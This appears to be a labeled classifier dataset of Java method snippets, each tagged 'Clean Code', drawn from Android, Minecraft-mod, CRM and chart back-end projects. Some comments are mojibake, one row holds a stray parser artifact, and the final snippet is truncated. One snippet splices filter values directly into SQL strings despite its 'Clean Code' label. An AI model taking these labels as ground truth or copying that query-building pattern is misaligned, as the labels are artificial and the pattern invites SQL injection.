 * Sets both of custom view holder class and layout resource for outcoming text message.
 * @param holder holder class.
 * @param layout layout resource.
 * @return {@link MessageHolders} for subsequent configuration.
 */
public MessageHolders setOutcomingTextConfig(@NonNull Class<? extends BaseMessageViewHolder<? extends IMessage>> holder,@LayoutRes int layout){
  this.outcomingTextConfig.holder=holder;
  this.outcomingTextConfig.layout=layout;
  return this;
}
/** 
 * Sets both of custom view holder class and layout resource for outcoming text message.
 * @param holder  holder class.
 * @param layout  layout resource.
 * @param payload custom data.
 * @return {@link MessageHolders} for subsequent configuration.
 */
public MessageHolders setOutcomingTextConfig(@NonNull Class<? extends BaseMessageViewHolder<? extends IMessage>> holder,@LayoutRes int layout,Object payload){
  this.outcomingTextConfig.holder=holder;
  this.outcomingTextConfig.layout=layout;
  this.outcomingTextConfig.payload=payload;
  return this;
}
",0,Clean Code
"@OnlyIn(Dist.CLIENT) public static void onClicked(InputEvent.InteractionKeyMappingTriggered event){
  if (relocatingTrain == null)   return;
  Minecraft mc=Minecraft.getInstance();
  LocalPlayer player=mc.player;
  if (player == null)   return;
  if (player.isSpectator())   return;
  if (!player.position().closerThan(relocatingOrigin,24) || player.isShiftKeyDown()) {
    relocatingTrain=null;
    player.displayClientMessage(Lang.translateDirect(""train.relocate.abort"").withStyle(ChatFormatting.RED),true);
    return;
  }
  if (player.isPassenger())   return;
  if (mc.level == null)   return;
  Train relocating=getRelocating(mc.level);
  if (relocating != null) {
    Boolean relocate=relocateClient(relocating,false);
    if (relocate != null && relocate.booleanValue())     relocatingTrain=null;
    if (relocate != null)     event.setCanceled(true);
  }
}",0,Clean Code
"public void add(final Element pointer){
synchronized (mExpandableArrayOfActivePointers) {
    if (DEBUG) {
      Log.d(TAG,""add: "" + pointer + "" ""+ this);
    }
    final ArrayList<Element> expandableArray=mExpandableArrayOfActivePointers;
    final int arraySize=mArraySize;
    if (arraySize < expandableArray.size()) {
      expandableArray.set(arraySize,pointer);
    }
 else {
      expandableArray.add(pointer);
    }
    mArraySize=arraySize + 1;
  }
}",0,Clean Code
"public static String getTruncatedCommandOutput(String text,int maxLength,boolean fromEnd,boolean onNewline,boolean addPrefix){
  if (text == null)   return null;
  String prefix=""(truncated) "";
  if (addPrefix)   maxLength=maxLength - prefix.length();
  if (maxLength < 0 || text.length() < maxLength)   return text;
  if (fromEnd) {
    text=text.substring(0,maxLength);
  }
 else {
    int cutOffIndex=text.length() - maxLength;
    if (onNewline) {
      int nextNewlineIndex=text.indexOf('\n',cutOffIndex);
      if (nextNewlineIndex != -1 && nextNewlineIndex != text.length() - 1) {
        cutOffIndex=nextNewlineIndex + 1;
      }
    }
    text=text.substring(cutOffIndex);
  }
  if (addPrefix)   text=prefix + text;
  return text;
}",0,Clean Code
"/** 
 * Clears all track selection overrides for the specified renderer.
 * @param rendererIndex The renderer index.
 * @return This builder.
 */
public final ParametersBuilder clearSelectionOverrides(int rendererIndex){
  Map<TrackGroupArray,SelectionOverride> overrides=selectionOverrides.get(rendererIndex);
  if (overrides == null || overrides.isEmpty()) {
    return this;
  }
  selectionOverrides.remove(rendererIndex);
  return this;
}
/** 
 * Clears all track selection overrides for all renderers.
 * @return This builder.
 */
public final ParametersBuilder clearSelectionOverrides(){
  if (selectionOverrides.size() == 0) {
    return this;
  }
  selectionOverrides.clear();
  return this;
}",0,Clean Code
"/** 
 * 涓虹┖鎼滅储
 * @param search       鎼滅储鏉′欢
 * @param queryBuilder 鏌ヨ鍣�
 */
private static void isNullSearch(CrmSearchBO.Search search,BoolQueryBuilder queryBuilder){
  FieldEnum fieldEnum=FieldEnum.parse(search.getFormType());
  if (Arrays.asList(FieldEnum.DATETIME,FieldEnum.DATE,FieldEnum.NUMBER,FieldEnum.FLOATNUMBER).contains(fieldEnum)) {
    queryBuilder.mustNot(QueryBuilders.existsQuery(search.getName()));
  }
 else {
    BoolQueryBuilder builder=QueryBuilders.boolQuery();
    builder.should(QueryBuilders.termQuery(search.getName(),""""));
    builder.should(QueryBuilders.boolQuery().mustNot(QueryBuilders.existsQuery(search.getName())));
    queryBuilder.filter(builder);
  }
}
",0,Clean Code
"public static <T,K>Map<K,T> convertMap(Collection<T> from,Function<T,K> keyFunc){
  if (CollUtil.isEmpty(from)) {
    return new HashMap<>();
  }
  return convertMap(from,keyFunc,Function.identity());
}
public static <T,K>Map<K,T> convertMap(Collection<T> from,Function<T,K> keyFunc,Supplier<? extends Map<K,T>> supplier){
  if (CollUtil.isEmpty(from)) {
    return supplier.get();
  }
  return convertMap(from,keyFunc,Function.identity(),supplier);
}
public static <T,K,V>Map<K,V> convertMap(Collection<T> from,Function<T,K> keyFunc,Function<T,V> valueFunc){
  if (CollUtil.isEmpty(from)) {
    return new HashMap<>();
  }
  return convertMap(from,keyFunc,valueFunc,(v1,v2) -> v1);
}
public static <T,K,V>Map<K,V> convertMap(Collection<T> from,Function<T,K> keyFunc,Function<T,V> valueFunc,BinaryOperator<V> mergeFunction){
  if (CollUtil.isEmpty(from)) {
    return new HashMap<>();
  }
  return convertMap(from,keyFunc,valueFunc,mergeFunction,HashMap::new);
}
public static <T,K,V>Map<K,V> convertMap(Collection<T> from,Function<T,K> keyFunc,Function<T,V> valueFunc,Supplier<? extends Map<K,V>> supplier){
  if (CollUtil.isEmpty(from)) {
    return supplier.get();
  }
  return convertMap(from,keyFunc,valueFunc,(v1,v2) -> v1,supplier);
}
public static <T,K,V>Map<K,V> convertMap(Collection<T> from,Function<T,K> keyFunc,Function<T,V> valueFunc,BinaryOperator<V> mergeFunction,Supplier<? extends Map<K,V>> supplier){
  if (CollUtil.isEmpty(from)) {
    return new HashMap<>();
  }
  return from.stream().collect(Collectors.toMap(keyFunc,valueFunc,mergeFunction,supplier));
}",0,Clean Code
"private LibSVMRegressionModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private LibSVMRegressionModelProto(){
  model_=java.util.Collections.emptyList();
  means_=emptyDoubleList();
  variances_=emptyDoubleList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@247ebe66",0,Clean Code
"@Override public ErrorCode action(ByteBuf ackPayload,String clientID,String fromUser,ProtoConstants.RequestSourceType requestSourceType,WFCMessage.DismissGroupRequest request,Qos1PublishHandler.IMCallback callback){
  WFCMessage.GroupInfo groupInfo=m_messagesStore.getGroupInfo(request.getGroupId());
  boolean isAdmin=requestSourceType == ProtoConstants.RequestSourceType.Request_From_Admin;
  ErrorCode errorCode;
  if (groupInfo == null) {
    errorCode=m_messagesStore.dismissGroup(fromUser,request.getGroupId(),isAdmin);
  }
 else   if (isAdmin || (groupInfo.getType() == ProtoConstants.GroupType.GroupType_Normal || groupInfo.getType() == ProtoConstants.GroupType.GroupType_Restricted) && groupInfo.getOwner() != null && groupInfo.getOwner().equals(fromUser)) {
    if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0 && requestSourceType == ProtoConstants.RequestSourceType.Request_From_User && !m_messagesStore.isAllowClientCustomGroupNotification()) {
      return ErrorCode.ERROR_CODE_NOT_RIGHT;
    }
    if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0 && requestSourceType == ProtoConstants.RequestSourceType.Request_From_Robot && !m_messagesStore.isAllowRobotCustomGroupNotification()) {
      return ErrorCode.ERROR_CODE_NOT_RIGHT;
    }
    if (requestSourceType == ProtoConstants.RequestSourceType.Request_From_User) {
      int forbiddenClientOperation=m_messagesStore.getGroupForbiddenClientOperation();
      if ((forbiddenClientOperation & ProtoConstants.ForbiddenClientGroupOperationMask.Forbidden_Dismiss_Group) > 0) {
        return ErrorCode.ERROR_CODE_NOT_RIGHT;
      }
    }
    if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0) {
      sendGroupNotification(fromUser,groupInfo.getTargetId(),request.getToLineList(),request.getNotifyContent());
    }
 else {
      WFCMessage.MessageContent content=new GroupNotificationBinaryContent(groupInfo.getTargetId(),fromUser,null,"""").getDismissGroupNotifyContent();
      sendGroupNotification(fromUser,request.getGroupId(),request.getToLineList(),content);
    }
    errorCode=m_messagesStore.dismissGroup(fromUser,request.getGroupId(),isAdmin);
  }
 else {
    errorCode=ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  return errorCode;
}",0,Clean Code
"/** 
 * 鎷掔粷
 * @param appraisalName
 * @param status        2 椹冲洖鐩爣 3 椹冲洖璇勫畾
 * @param reason        鍘熷洜
 */
public Content reject(String appraisalName,Long employeeAppraisalId,Integer status,String reason){
  String content;
  String transContent;
  int two=2;
  if (status == two) {
    content=""椹冲洖浜嗙洰鏍�,椹冲洖鐞嗙敱锛�"" + reason;
    transContent=HrmLanguageEnum.TARGET_REJECTED.getFieldFormat() + "","" + HrmLanguageEnum.REJECTED_REASON.getFieldFormat()+ ""锛�""+ reason;
  }
 else {
    content=""椹冲洖浜嗚瘎瀹�,椹冲洖鐞嗙敱锛�"" + reason;
    transContent=HrmLanguageEnum.EVALUATE_REJECTED.getFieldFormat() + "","" + HrmLanguageEnum.REJECTED_REASON.getFieldFormat()+ ""锛�""+ reason;
  }
  save(content,transContent,employeeAppraisalId);
  return new Content(appraisalName,content,transContent,BehaviorEnum.UPDATE);
}",0,Clean Code
"@Override protected final void onCreate(@Nullable Bundle savedInstanceState){
  setTheme(Prefs.Appearance.isPureBlackTheme() ? R.style.AppTheme_Splash_Black : R.style.AppTheme_Splash);
  EdgeToEdge.enable(this);
  super.onCreate(savedInstanceState);
  SplashScreen.installSplashScreen(this);
  DynamicColors.applyToActivityIfAvailable(this);
  setContentView(R.layout.activity_authentication);
  ((TextView)findViewById(R.id.version)).setText(String.format(Locale.ROOT,""%s (%d)"",BuildConfig.VERSION_NAME,BuildConfig.VERSION_CODE));
  mStateNameView=findViewById(R.id.state_name);
  if (Ops.isAuthenticated()) {
    Log.d(TAG,""Already authenticated."");
    startActivity(new Intent(this,MainActivity.class));
    finish();
    return;
  }
  if (Boolean.TRUE.equals(BuildExpiryChecker.buildExpired())) {
    BuildExpiryChecker.getBuildExpiredDialog(this).show();
    return;
  }
  mViewModel=new ViewModelProvider(this).get(SecurityAndOpsViewModel.class);
  Log.d(TAG,""Waiting to be authenticated."");
  mViewModel.authenticationStatus().observe(this,status -> {
switch (status) {
case Ops.STATUS_AUTO_CONNECT_WIRELESS_DEBUGGING:
      Log.d(TAG,""Try auto-connecting to wireless debugging."");
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
      mViewModel.autoConnectWirelessDebugging();
      return;
    }
case Ops.STATUS_WIRELESS_DEBUGGING_CHOOSER_REQUIRED:
  Log.d(TAG,""Display wireless debugging chooser (pair or connect)"");
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
  Ops.connectWirelessDebugging(this,mViewModel);
  return;
}
case Ops.STATUS_ADB_CONNECT_REQUIRED:
Log.d(TAG,""Display connect dialog."");
Ops.connectAdbInput(this,mViewModel);
return;
case Ops.STATUS_ADB_PAIRING_REQUIRED:
Log.d(TAG,""Display pairing dialog."");
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
Ops.pairAdbInput(this,mViewModel);
return;
}
case Ops.STATUS_FAILURE_ADB_NEED_MORE_PERMS:
Ops.displayIncompleteUsbDebuggingMessage(this);
case Ops.STATUS_SUCCESS:
case Ops.STATUS_FAILURE:
Log.d(TAG,""Authentication completed."");
mViewModel.setAuthenticating(false);
Ops.setAuthenticated(this,true);
startActivity(new Intent(this,MainActivity.class));
finish();
}
}
);
if (!mViewModel.isAuthenticating()) {
mViewModel.setAuthenticating(true);
authenticate();
}
}
",0,Clean Code
"@Override public void onCreate(){
  super.onCreate();
  if (!isUnderTest())   Log.init(getCacheDir().getAbsolutePath());
  Utils.BuildType buildtp=Utils.getVerifiedBuild(this);
  Log.i(TAG,""Build type: "" + buildtp);
  CaocConfig.Builder builder=CaocConfig.Builder.create();
  if ((buildtp == Utils.BuildType.PLAYSTORE) || (buildtp == Utils.BuildType.UNKNOWN)) {
    builder.enabled(false);
  }
 else {
    builder.errorDrawable(R.drawable.ic_app_crash).errorActivity(ErrorActivity.class);
  }
  builder.apply();
  mInstance=new WeakReference<>(this);
  mLocalizedContext=createConfigurationContext(Utils.getLocalizedConfig(this));
  SharedPreferences prefs=PreferenceManager.getDefaultSharedPreferences(this);
  String theme=prefs.getString(Prefs.PREF_APP_THEME,"""");
  if ("""".equals(theme)) {
    if (Utils.isTv(this)) {
      theme=""dark"";
      prefs.edit().putString(Prefs.PREF_APP_THEME,theme).apply();
    }
 else     theme=""system"";
  }
  Utils.setAppTheme(theme);
  IntentFilter filter=new IntentFilter();
  filter.addAction(Intent.ACTION_PACKAGE_ADDED);
  filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
  filter.addDataScheme(""package"");
  registerReceiver(new BroadcastReceiver(){
    @Override public void onReceive(    Context context,    Intent intent){
      if (Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction())) {
        boolean newInstall=!intent.getBooleanExtra(Intent.EXTRA_REPLACING,false);
        String packageName=intent.getData().getSchemeSpecificPart();
        Log.d(TAG,""ACTION_PACKAGE_ADDED [new="" + newInstall + ""]: ""+ packageName);
        if (newInstall)         checkUidMapping(packageName);
      }
 else       if (Intent.ACTION_PACKAGE_REMOVED.equals(intent.getAction())) {
        boolean isUpdate=intent.getBooleanExtra(Intent.EXTRA_REPLACING,false);
        String packageName=intent.getData().getSchemeSpecificPart();
        Log.d(TAG,""ACTION_PACKAGE_REMOVED [update="" + isUpdate + ""]: ""+ packageName);
        if (!isUpdate) {
          checkUidMapping(packageName);
          removeUninstalledAppsFromAppFilter();
        }
      }
    }
  }
,filter);
  removeUninstalledAppsFromAppFilter();
}
",0,Clean Code
"/** 
 * @TCDescription : 澶氱鎴锋敞鍐孖P锛実etInstance鎺ュ彛
 * @TestStep :
 * @ExpectResult :
 */
@Test public void multipleTenant_group_getInstance() throws Exception {
  String serviceName=randomDomainName();
  naming1.registerInstance(serviceName,""11.11.11.11"",80);
  naming2.registerInstance(serviceName,""22.22.22.22"",80);
  naming.registerInstance(serviceName,""33.33.33.33"",8888,""c1"");
  naming.registerInstance(serviceName,""44.44.44.44"",8888,""c2"");
  TimeUnit.SECONDS.sleep(5L);
  ResponseEntity<String> response=request(""/nacos/v1/ns/instance"",Params.newParams().appendParam(""serviceName"",serviceName).appendParam(""groupName"",TEST_GROUP_1).appendParam(""ip"",""33.33.33.33"").appendParam(""port"",""8888"").appendParam(""namespaceId"",""namespace-2"").done(),String.class);
  Assert.assertEquals(HttpStatus.NOT_FOUND,response.getStatusCode());
  response=request(""/nacos/v1/ns/instance/list"",Params.newParams().appendParam(""serviceName"",serviceName).appendParam(""clusters"",""c2"").appendParam(""healthyOnly"",""true"").done(),String.class);
  Assert.assertTrue(response.getStatusCode().is2xxSuccessful());
  JSONObject json=JSON.parseObject(response.getBody());
  Assert.assertEquals(1,json.getJSONArray(""hosts"").size());
  Assert.assertEquals(""44.44.44.44"",json.getJSONArray(""hosts"").getJSONObject(0).getString(""ip""));
}",0,Clean Code
"/** 
 * Consumes caption data (cc_data), writing the content as samples to all of the provided outputs.
 * @param presentationTimeUs The presentation time in microseconds for any samples.
 * @param ccDataBuffer The buffer containing the caption data.
 * @param outputs The outputs to which any samples should be written.
 */
public static void consumeCcData(long presentationTimeUs,ParsableByteArray ccDataBuffer,TrackOutput[] outputs){
  int firstByte=ccDataBuffer.readUnsignedByte();
  boolean processCcDataFlag=(firstByte & 0x40) != 0;
  if (!processCcDataFlag) {
    return;
  }
  int ccCount=firstByte & 0x1F;
  ccDataBuffer.skipBytes(1);
  int sampleLength=ccCount * 3;
  int sampleStartPosition=ccDataBuffer.getPosition();
  for (  TrackOutput output : outputs) {
    ccDataBuffer.setPosition(sampleStartPosition);
    output.sampleData(ccDataBuffer,sampleLength);
    output.sampleMetadata(presentationTimeUs,C.BUFFER_FLAG_KEY_FRAME,sampleLength,0,null);
  }
}",0,Clean Code
"@Override protected void write(CompoundTag tag,boolean clientPacket){
  super.write(tag,clientPacket);
  tag.putBoolean(""Controller"",isController);
  tag.putInt(""XSize"",xSize);
  tag.putInt(""YSize"",ySize);
  for (int j=0; j < manualLines.length; j++)   if (manualLines[j])   NBTHelper.putMarker(tag,""CustomLine"" + j);
  for (int j=0; j < glowingLines.length; j++)   if (glowingLines[j])   NBTHelper.putMarker(tag,""GlowingLine"" + j);
  for (int j=0; j < colour.length; j++)   if (colour[j] != null)   NBTHelper.writeEnum(tag,""Dye"" + j,colour[j]);
  List<FlapDisplayLayout> lines=getLines();
  for (int i=0; i < lines.size(); i++)   tag.put(""Display"" + i,lines.get(i).write());
}",0,Clean Code
"public void setStickersSet(TLRPC.StickerSetCovered set,boolean divider){
  needDivider=divider;
  stickersSet=set;
  setWillNotDraw(!needDivider);
  textView.setText(stickersSet.set.title);
  valueTextView.setText(LocaleController.formatPluralString(""Stickers"",set.set.count));
  TLRPC.Document sticker;
  if (set.cover != null) {
    sticker=set.cover;
  }
 else   if (!set.covers.isEmpty()) {
    sticker=set.covers.get(0);
  }
 else {
    sticker=null;
  }
  if (sticker != null) {
    TLObject object=FileLoader.getClosestPhotoSizeWithSize(set.set.thumbs,90);
    if (object == null) {
      object=sticker;
    }
    SvgHelper.SvgDrawable svgThumb=DocumentObject.getSvgThumb(set.set.thumbs,Theme.key_windowBackgroundGray,1.0f);
    ImageLocation imageLocation;
    if (object instanceof TLRPC.Document) {
      TLRPC.PhotoSize thumb=FileLoader.getClosestPhotoSizeWithSize(sticker.thumbs,90);
      imageLocation=ImageLocation.getForDocument(thumb,sticker);
    }
 else {
      TLRPC.PhotoSize thumb=(TLRPC.PhotoSize)object;
      imageLocation=ImageLocation.getForSticker(thumb,sticker,set.set.thumb_version);
    }
    if (object instanceof TLRPC.Document && MessageObject.isAnimatedStickerDocument(sticker,true)) {
      if (svgThumb != null) {
        imageView.setImage(ImageLocation.getForDocument(sticker),""50_50"",svgThumb,0,set);
      }
 else {
        imageView.setImage(ImageLocation.getForDocument(sticker),""50_50"",imageLocation,null,0,set);
      }
    }
 else     if (imageLocation != null && imageLocation.imageType == FileLoader.IMAGE_TYPE_LOTTIE) {
      imageView.setImage(imageLocation,""50_50"",""tgs"",svgThumb,set);
    }
 else {
      imageView.setImage(imageLocation,""50_50"",""webp"",svgThumb,set);
    }
  }
 else {
    imageView.setImage(null,null,""webp"",null,set);
  }
}",0,Clean Code
"public static List<SQLQueryAdapter> getAllOptimizer(MariaDBGlobalState globalState){
  List<SQLQueryAdapter> result=new ArrayList<>();
  String[] options={""condition_pushdown_for_derived"",""condition_pushdown_for_subquery"",""condition_pushdown_from_having"",""derived_merge"",""derived_with_keys"",""engine_condition_pushdown"",""exists_to_in"",""extended_keys"",""firstmatch"",""index_condition_pushdown"",""hash_join_cardinality"",""index_merge"",""index_merge_intersection"",""index_merge_sort_intersection"",""index_merge_sort_union"",""index_merge_union"",""in_to_exists"",""join_cache_bka"",""join_cache_hashed"",""join_cache_incremental"",""loosescan"",""materialization"",""mrr"",""mrr_cost_based"",""mrr_sort_keys"",""not_null_range_scan"",""optimize_join_buffer_size"",""orderby_uses_equalities"",""outer_join_with_cache"",""partial_match_rowid_merge"",""partial_match_table_scan"",""rowid_filter"",""semijoin"",""semijoin_with_cache"",""split_materialized"",""subquery_cache"",""table_elimination""};
  List<String> availableOptions=new ArrayList<>(Arrays.asList(options));
  if (MariaDBBugs.bug21058) {
    availableOptions.remove(""in_to_exists"");
  }
  if (MariaDBBugs.bug32076) {
    availableOptions.remove(""not_null_range_scan"");
  }
  if (MariaDBBugs.bug32099) {
    availableOptions.remove(""optimize_join_buffer_size"");
  }
  if (MariaDBBugs.bug32105) {
    availableOptions.remove(""join_cache_hashed"");
  }
  if (MariaDBBugs.bug32106) {
    availableOptions.remove(""outer_join_with_cache"");
  }
  if (MariaDBBugs.bug32107) {
    availableOptions.remove(""table_elimination"");
  }
  if (MariaDBBugs.bug32108) {
    availableOptions.remove(""join_cache_incremental"");
  }
  if (MariaDBBugs.bug32143) {
    availableOptions.remove(""mrr"");
  }
  StringBuilder sb=new StringBuilder();
  sb.append(""SET SESSION optimizer_switch = '%s'"");
  for (  String option : availableOptions) {
    result.add(new SQLQueryAdapter(String.format(sb.toString(),option + ""=on""),ExpectedErrors.from(""At least one of the 'in_to_exists' or 'materialization' optimizer_switch flags must be 'on'"")));
    result.add(new SQLQueryAdapter(String.format(sb.toString(),option + ""=off""),ExpectedErrors.from(""At least one of the 'in_to_exists' or 'materialization' optimizer_switch flags must be 'on'"")));
    result.add(new SQLQueryAdapter(String.format(sb.toString(),option + ""=default""),ExpectedErrors.from(""At least one of the 'in_to_exists' or 'materialization' optimizer_switch flags must be 'on'"")));
  }
  return result;
}",0,Clean Code
"/** 
 * Creates a wrapper for a  {@link CronetEngine} which automatically selects the most suitable{@link CronetProvider}. Sets wrapper to prefer natively bundled Cronet over GMSCore Cronet if both are available.
 * @param context A context.
 */
public CronetEngineWrapper(Context context){
  this(context,false);
}
/** 
 * Creates a wrapper for a  {@link CronetEngine} which automatically selects the most suitable{@link CronetProvider} based on user preference.
 * @param context A context.
 * @param preferGMSCoreCronet Whether Cronet from GMSCore should be preferred over nativelybundled Cronet if both are available.
 */
public CronetEngineWrapper(Context context,boolean preferGMSCoreCronet){
  CronetEngine cronetEngine=null;
  @CronetEngineSource int cronetEngineSource=SOURCE_UNAVAILABLE;
  List<CronetProvider> cronetProviders=new ArrayList<>(CronetProvider.getAllProviders(context));
  for (int i=cronetProviders.size() - 1; i >= 0; i--) {
    if (!cronetProviders.get(i).isEnabled() || CronetProvider.PROVIDER_NAME_FALLBACK.equals(cronetProviders.get(i).getName())) {
      cronetProviders.remove(i);
    }
  }
  CronetProviderComparator providerComparator=new CronetProviderComparator(preferGMSCoreCronet);
  Collections.sort(cronetProviders,providerComparator);
  for (int i=0; i < cronetProviders.size() && cronetEngine == null; i++) {
    String providerName=cronetProviders.get(i).getName();
    try {
      cronetEngine=cronetProviders.get(i).createBuilder().enableQuic(true).enableHttp2(true).enableBrotli(true).build();
      if (providerComparator.isNativeProvider(providerName)) {
        cronetEngineSource=SOURCE_NATIVE;
      }
 else       if (providerComparator.isGMSCoreProvider(providerName)) {
        cronetEngineSource=SOURCE_GMS;
      }
 else {
        cronetEngineSource=SOURCE_UNKNOWN;
      }
      Log.d(TAG,""CronetEngine built using "" + providerName);
    }
 catch (    SecurityException e) {
      Log.w(TAG,""Failed to build CronetEngine. Please check if current process has "" + ""android.permission.ACCESS_NETWORK_STATE."");
    }
catch (    UnsatisfiedLinkError e) {
      Log.w(TAG,""Failed to link Cronet binaries. Please check if native Cronet binaries are "" + ""bundled into your app."");
    }
  }
  if (cronetEngine == null) {
    Log.w(TAG,""Cronet not available. Using fallback provider."");
  }
  this.cronetEngine=cronetEngine;
  this.cronetEngineSource=cronetEngineSource;
}
/** 
 * Creates a wrapper for an existing CronetEngine.
 * @param cronetEngine An existing CronetEngine.
 */
public CronetEngineWrapper(CronetEngine cronetEngine){
  this.cronetEngine=cronetEngine;
  this.cronetEngineSource=SOURCE_USER_PROVIDED;
}",0,Clean Code
"public List<String> getFieldData(ChartViewDTO view,Long fieldId,String fieldType) throws Exception {
  ChartExtRequest requestList=view.getChartExtRequest();
  List<String[]> sqlData=sqlData(view,requestList,fieldId);
  List<ChartViewFieldDTO> fieldList=new ArrayList<>();
switch (fieldType) {
case ""xAxis"":
    ;
case ""xAxisExt"":
  ;
case ""extStack"":
;
}
DatasetTableFieldDTO field=datasetTableFieldManage.selectById(fieldId);
List<String> res=new ArrayList<>();
if (ObjectUtils.isNotEmpty(field) && fieldList.size() > 0) {
ChartViewFieldDTO chartViewFieldDTO=null;
int index=0;
int getIndex=0;
for (int i=0; i < fieldList.size(); i++) {
ChartViewFieldDTO item=fieldList.get(i);
if (StringUtils.equalsIgnoreCase(item.getSort(),""custom_sort"")) {
  chartViewFieldDTO=item;
  index=i;
}
if (Objects.equals(item.getId(),field.getId())) {
  getIndex=i;
}
}
if (StringUtils.equalsIgnoreCase(fieldType,""xAxisExt"")) {
List<ChartViewFieldDTO> xAxis=view.getXAxis();
index+=xAxis.size();
getIndex+=xAxis.size();
}
if (StringUtils.equalsIgnoreCase(fieldType,""extStack"")) {
int xAxisSize=CollectionUtils.size(view.getXAxis());
int extSize=CollectionUtils.size(view.getXAxisExt());
index+=xAxisSize + extSize;
getIndex+=xAxisSize + extSize;
}
List<String[]> sortResult=resultCustomSort(fieldList,sqlData);
if (ObjectUtils.isNotEmpty(chartViewFieldDTO) && (getIndex >= index)) {
List<String[]> strings=customSort(Optional.ofNullable(chartViewFieldDTO.getCustomSort()).orElse(new ArrayList<>()),sortResult,index);
for (int i=0; i < strings.size(); i++) {
  res.add(strings.get(i)[getIndex]);
}
}
 else {
for (int i=0; i < sortResult.size(); i++) {
  res.add(sortResult.get(i)[getIndex]);
}
}
}
return res.stream().distinct().collect(Collectors.toList());
}",0,Clean Code
"/** 
 * 鍒锋柊浠ょ墝鏈夋晥鏈�
 * @param loginUser 鐧诲綍淇℃伅
 */
public void refreshToken(LoginUser loginUser){
  String userKey=getTokenKey(loginUser.getToken());
  LoginUserToken loginUserToken=redisCache.getCacheObject(userKey);
  refreshToken(loginUser,loginUserToken);
}
/** 
 * 鍒锋柊浠ょ墝鏈夋晥鏈�
 * @param loginUser 鐧诲綍淇℃伅
 */
public void refreshToken(LoginUser loginUser,LoginUserToken loginUserToken){
  loginUserToken.setLoginTime(System.currentTimeMillis());
  loginUser.setExpireTime(loginUserToken.getLoginTime() + expireTime * MILLIS_MINUTE);
  loginUserToken.setExpireTime(loginUserToken.getLoginTime() + expireTime * MILLIS_MINUTE);
  String userKey=getTokenKey(loginUser.getToken());
  redisCache.setCacheObject(userKey,loginUserToken,expireTime,TimeUnit.MINUTES);
  redisCache.setCacheObject(getLoginKey(loginUser.getUserId()),loginUser,expireTime,TimeUnit.MINUTES);
}
",0,Clean Code
"public static String encode(String src){
  StringBuilder sb=new StringBuilder();
  char[] chars=src.toCharArray();
  int[] ibuf=new int[6];
  int[] obuf=new int[8];
  for (int c=0; c < chars.length / 3; c++) {
    for (int i=0; i < 3; i++) {
      ibuf[i * 2 + 0]=chars[c * 3 + i] & 0xFF;
      ibuf[i * 2 + 1]=(chars[c * 3 + i] >> 8) & 0xFF;
    }
    encodeStep(ibuf,obuf);
    for (int i=0; i < 8; i++) {
      sb.append(DICT.charAt(obuf[i]));
    }
  }
  int tail=chars.length % 3;
  if (tail != 0) {
    int tailStart=chars.length / 3 * 3;
    char PAD=DICT.charAt(DICT.length() - 1);
    for (int i=0; i < tail; i++) {
      ibuf[i * 2 + 0]=chars[tailStart + i] & 0xFF;
      ibuf[i * 2 + 1]=(chars[tailStart + i] >> 8) & 0xFF;
    }
    for (int i=tail; i < 3; i++) {
      ibuf[i * 2 + 0]=0;
      ibuf[i * 2 + 1]=0;
    }
    encodeStep(ibuf,obuf);
    for (int i=0; i < tail * 3; i++) {
      sb.append(DICT.charAt(obuf[i]));
    }
    for (int i=tail * 3; i < 8; i++) {
      sb.append(PAD);
    }
  }
  return sb.toString();
}",0,Clean Code
"private static String getYWheres(ChartViewFieldDTO y,String originField,String fieldAlias){
  List<SQLObj> list=new ArrayList<>();
  if (!CollectionUtils.isEmpty(y.getFilter()) && y.getFilter().size() > 0) {
    y.getFilter().forEach(f -> {
      String whereTerm=Utils.transFilterTerm(f.getTerm());
      String whereValue="""";
      if (StringUtils.equalsIgnoreCase(f.getTerm(),""null"")) {
        whereValue="""";
      }
 else       if (StringUtils.equalsIgnoreCase(f.getTerm(),""not_null"")) {
        whereValue="""";
      }
 else       if (StringUtils.equalsIgnoreCase(f.getTerm(),""empty"")) {
        whereValue=""''"";
      }
 else       if (StringUtils.equalsIgnoreCase(f.getTerm(),""not_empty"")) {
        whereValue=""''"";
      }
 else       if (StringUtils.containsIgnoreCase(f.getTerm(),""in"")) {
        whereValue=""('"" + StringUtils.join(f.getValue(),""','"") + ""')"";
      }
 else       if (StringUtils.containsIgnoreCase(f.getTerm(),""like"")) {
        whereValue=""'%"" + f.getValue() + ""%'"";
      }
 else {
        whereValue=String.format(SQLConstants.WHERE_VALUE_VALUE,f.getValue());
      }
      list.add(SQLObj.builder().whereField(fieldAlias).whereAlias(fieldAlias).whereTermAndValue(whereTerm + whereValue).build());
    }
);
  }
  List<String> strList=new ArrayList<>();
  list.forEach(ele -> strList.add(ele.getWhereField() + "" "" + ele.getWhereTermAndValue()));
  return !CollectionUtils.isEmpty(list) ? ""("" + String.join("" "" + Utils.getLogic(y.getLogic()) + "" "",strList) + "")"" : null;
}",0,Clean Code
"private void updateView(){
  setEnabled(users.size() > 0);
  for (int i=0; i < 3; i++) {
    if (i < users.size()) {
      avatarsImageView.setObject(i,currentAccount,users.get(i));
    }
 else {
      avatarsImageView.setObject(i,currentAccount,null);
    }
  }
  if (users.size() == 1) {
    avatarsImageView.setTranslationX(AndroidUtilities.dp(24));
  }
 else   if (users.size() == 2) {
    avatarsImageView.setTranslationX(AndroidUtilities.dp(12));
  }
 else {
    avatarsImageView.setTranslationX(0);
  }
  titleView.setRightPadding(AndroidUtilities.dp(8 + 24 + Math.min(2,users.size() - 1) * 12 + 6));
  avatarsImageView.commitTransition(false);
  if (peerIds.size() == 1 && users.get(0) != null) {
    titleView.setText(ContactsController.formatName(users.get(0).first_name,users.get(0).last_name));
  }
 else {
    if (peerIds.size() == 0) {
      titleView.setText(LocaleController.getString(""NobodyViewed"",R.string.NobodyViewed));
    }
 else {
      titleView.setText(LocaleController.formatPluralString(isVoice ? ""MessagePlayed"" : ""MessageSeen"",peerIds.size()));
    }
  }
  titleView.animate().alpha(1f).setDuration(220).start();
  avatarsImageView.animate().alpha(1f).setDuration(220).start();
